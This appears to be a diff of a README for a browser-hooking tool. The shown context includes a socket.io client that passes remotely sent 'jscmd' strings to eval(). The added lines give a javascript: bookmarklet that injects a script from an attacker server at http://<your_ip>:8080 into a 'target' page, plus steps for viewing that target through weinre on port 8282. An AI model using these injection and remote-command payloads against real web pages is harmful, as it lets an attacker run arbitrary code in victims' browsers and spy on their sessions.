@@ -57,7 +57,30 @@ Usage
             socket.on('connect', function(){console.log('CLIENT socket.on: connect');socket.emit('connect', {data: navigator.userAgent});});
             socket.on('jscmd', function(data){try{eval(data.cmd);}catch(error){console.log(error);}});
         }
-    </script>
+        </script>
+        
+ - Soon I plan to incorporate the use of a bookmarklet target like this.:
+ 
+        javascript:(function(e){e.setAttribute("src","http://<your_ip>:8080/socket.io/socket.io.js");document.getElementsByTagName("body")[0].appendChild(e);})(document.createElement("script"));void(0);
+    
+Weinre
+=====
+
+ - If you want to use 'weinre' you must click the button weinre "JSCONSOLE".
+   This will inject the script server connection in your target web page.
+   As the server is already started on the 8282 port, your target page will be displayed in the web interface weinre.
+   
+   Current injection is not dynamic with the IP address of your server. I will address shortly.
+   
+   If you really want to use weinre, you must edit the file 'UicConsole.ejs' in your modules folder.
+   
+        var _HOST = '127.0.0.1';
+
+ - Open your browser for access to the `weinre`.
+
+        http://< your_ip >:8282
+    
+
 
 Command parameters
 =====
